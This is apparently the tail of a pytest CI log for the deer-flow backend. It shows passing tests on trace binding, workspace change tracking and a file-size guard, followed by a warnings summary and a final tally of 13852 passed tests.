+tests/test_worker_trace_binding.py::test_caller_supplied_metadata_trace_id_is_overwritten PASSED [ 99%]
+tests/test_worker_trace_binding.py::test_caller_supplied_context_trace_id_is_overwritten PASSED [ 99%]
+tests/test_worker_trace_binding.py::test_both_forks_agree_when_the_caller_forges_both PASSED [ 99%]
+tests/test_worker_trace_binding.py::test_run_without_an_ambient_trace_still_gets_one PASSED [ 99%]
+tests/test_worker_trace_binding.py::test_build_runtime_context_drops_a_caller_supplied_trace_id PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_reports_text_file_changes PASSED [ 99%]
+tests/test_workspace_changes.py::test_get_changed_output_paths_returns_only_created_or_modified_regular_outputs PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_treats_utf16_markdown_as_text PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_reads_cached_utf16_markdown_baseline PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_treats_utf8_markdown_crossing_sample_boundary_as_text PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_strips_utf8_bom PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_keeps_nul_bytes_classified_as_binary PASSED [ 99%]
+tests/test_workspace_changes.py::test_count_diff_lines_ignores_only_real_headers PASSED [ 99%]
+tests/test_workspace_changes.py::test_count_diff_lines_counts_content_starting_with_dashes_or_pluses PASSED [ 99%]
+tests/test_workspace_changes.py::test_scan_workspace_roots_skips_excluded_directories PASSED [ 99%]
+tests/test_workspace_changes.py::test_scan_workspace_roots_skips_stdio_mcp_temp_files PASSED [ 99%]
+tests/test_workspace_changes.py::test_scan_workspace_roots_skips_browser_frames PASSED [ 99%]
+tests/test_workspace_changes.py::test_scan_workspace_roots_skips_externalized_tool_results PASSED [ 99%]
+tests/test_workspace_changes.py::test_scan_workspace_roots_skips_extra_excluded_dir_names PASSED [ 99%]
+tests/test_workspace_changes.py::test_get_changed_output_paths_ignores_externalized_tool_results PASSED [ 99%]
+tests/test_workspace_changes.py::test_scan_workspace_roots_can_skip_text_loading PASSED [ 99%]
+tests/test_workspace_changes.py::test_sensitive_workspace_path_covers_common_secret_names PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_hides_sensitive_and_binary_file_content PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_classifies_symlink_replacing_file_as_symlink_created PASSED [ 99%]
+tests/test_workspace_changes.py::test_scan_workspace_roots_captures_symlinks_as_metadata_only_stubs PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_reports_removed_symlink_without_replacement_as_deleted PASSED [ 99%]
+tests/test_workspace_changes.py::test_compare_snapshots_truncates_large_text_diffs PASSED [ 99%]
+tests/test_workspace_changes.py::test_workspace_changes_response_returns_summary_only_and_full_payload PASSED [ 99%]
+tests/test_workspace_changes.py::test_workspace_changes_response_is_empty_when_no_event_exists PASSED [ 99%]
+tests/test_workspace_changes.py::test_run_agent_records_workspace_changes_event[asyncio] PASSED [ 99%]
+tests/test_workspace_changes.py::test_record_workspace_changes_content_uses_total_changed_count[asyncio] PASSED [ 99%]
+tests/test_workspace_changes.py::test_record_workspace_changes_uses_cached_baseline_for_modified_diff[asyncio] PASSED [ 99%]
+tests/test_workspace_changes.py::test_workspace_changes_route_forwards_include_files_flag[asyncio] PASSED [ 99%]
+tests/test_write_file_tool_size_guard.py::test_below_cap_succeeds PASSED [ 99%]
+tests/test_write_file_tool_size_guard.py::test_above_cap_returns_actionable_error PASSED [ 99%]
+tests/test_write_file_tool_size_guard.py::test_above_cap_with_append_true_bypasses_guard PASSED [ 99%]
+tests/test_write_file_tool_size_guard.py::test_env_override_raises_cap PASSED [ 99%]
+tests/test_write_file_tool_size_guard.py::test_env_override_zero_disables_guard PASSED [ 99%]
+tests/test_write_file_tool_size_guard.py::test_env_override_malformed_falls_back_to_default PASSED [100%]
+
+=============================== warnings summary ===============================
+.venv/lib/python3.12/site-packages/fastapi/testclient.py:1
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/fastapi/testclient.py:1: StarletteDeprecationWarning: Using `httpx` with `starlette.testclient` is deprecated; install `httpx2` instead.
+    from starlette.testclient import TestClient as TestClient  # noqa
+
+tests/test_auth_errors.py::test_decode_token_returns_token_error_on_bad_signature
+tests/test_auth_type_system.py::test_get_current_user_invalid_token_returns_token_invalid
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/jwt/api_jwt.py:147: InsecureKeyLengthWarning: The HMAC key is 12 bytes long, which is below the minimum recommended length of 32 bytes for SHA256. See RFC 7518 Section 3.2.
+    return self._jws.encode(
+
+tests/test_auth_middleware.py::test_auth_disabled_does_not_clobber_valid_session_cookie
+tests/test_initialize_admin.py::test_initialize_accessible_without_cookie
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/starlette/testclient.py:454: DeprecationWarning: Setting per-request cookies=<...> is being deprecated, because the expected behaviour on cookie persistence is ambiguous. Set cookies directly on the client instance instead.
+    return super().request(
+
+tests/test_auth_type_system.py::test_decode_token_invalid_sig_maps_to_token_invalid_code
+tests/test_auth_type_system.py::test_api_auth_me_invalid_sig_returns_structured_401
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/jwt/api_jwt.py:147: InsecureKeyLengthWarning: The HMAC key is 9 bytes long, which is below the minimum recommended length of 32 bytes for SHA256. See RFC 7518 Section 3.2.
+    return self._jws.encode(
+
+tests/test_channels.py::TestFeishuChannel::test_streaming_reuses_single_running_card
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/lark_oapi/ws/pb/google/protobuf/internal/well_known_types.py:91: DeprecationWarning: datetime.datetime.utcfromtimestamp() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.fromtimestamp(timestamp, datetime.UTC).
+    _EPOCH_DATETIME_NAIVE = datetime.datetime.utcfromtimestamp(0)
+
+tests/test_channels.py::TestFeishuChannel::test_streaming_reuses_single_running_card
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/lark_oapi/ws/client.py:67: DeprecationWarning: websockets.InvalidStatusCode is deprecated
+    def _parse_ws_conn_exception(e: websockets.InvalidStatusCode):
+
+tests/test_channels.py::TestFeishuChannel::test_streaming_reuses_single_running_card
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/websockets/legacy/__init__.py:6: DeprecationWarning: websockets.legacy is deprecated; see https://websockets.readthedocs.io/en/stable/howto/upgrade.html for upgrade instructions
+    warnings.warn(  # deprecated in 14.0 - 2024-11-09
+
+tests/test_channels.py::TestWeComChannel::test_on_outbound_sends_attachment_before_clearing_context
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/aibot/ws.py:28: DeprecationWarning: websockets.client.WebSocketClientProtocol is deprecated
+    from websockets.client import WebSocketClientProtocol
+
+tests/test_extensions_config_atomic_write.py::test_extensions_config_file_lock_serializes_cross_process_read_modify_write
+tests/test_extensions_config_atomic_write.py::test_extensions_config_file_lock_serializes_cross_process_read_modify_write
+tests/test_lark_cli_integration.py::test_concurrent_lark_skill_reinstalls_serialize_across_processes
+tests/test_lark_cli_integration.py::test_concurrent_lark_skill_reinstalls_serialize_across_processes
+  /opt/hostedtoolcache/Python/3.12.14/x64/lib/python3.12/multiprocessing/popen_fork.py:66: DeprecationWarning: This process (pid=18362) is multi-threaded, use of fork() may lead to deadlocks in the child.
+    self.pid = os.fork()
+
+tests/test_model_factory.py::test_unknown_config_key_emits_warning
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/_pytest/python.py:166: UserWarning: WARNING! definitely_not_a_real_kwarg is not default parameter.
+                  definitely_not_a_real_kwarg was transferred to model_kwargs.
+                  Please confirm that definitely_not_a_real_kwarg is what you intended.
+    result = testfunction(**testargs)
+
+tests/test_openviking_mcp_integration.py::test_openviking_http_mcp_discovers_exposes_and_calls_native_tools
+  /home/runner/work/deer-flow/deer-flow/backend/.venv/lib/python3.12/site-packages/uvicorn/protocols/websockets/websockets_impl.py:17: DeprecationWarning: websockets.server.WebSocketServerProtocol is deprecated
+    from websockets.server import WebSocketServerProtocol
+
+tests/test_openviking_mcp_integration.py::test_openviking_http_mcp_discovers_exposes_and_calls_native_tools
+tests/test_openviking_mcp_integration.py::test_openviking_http_mcp_discovers_exposes_and_calls_native_tools
+  /opt/hostedtoolcache/Python/3.12.14/x64/lib/python3.12/contextlib.py:105: DeprecationWarning: Use `streamable_http_client` instead.
+    self.gen = func(*args, **kwds)
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=== 13852 passed, 36 skipped, 2 deselected, 19 warnings in 444.84s (0:07:24) ===
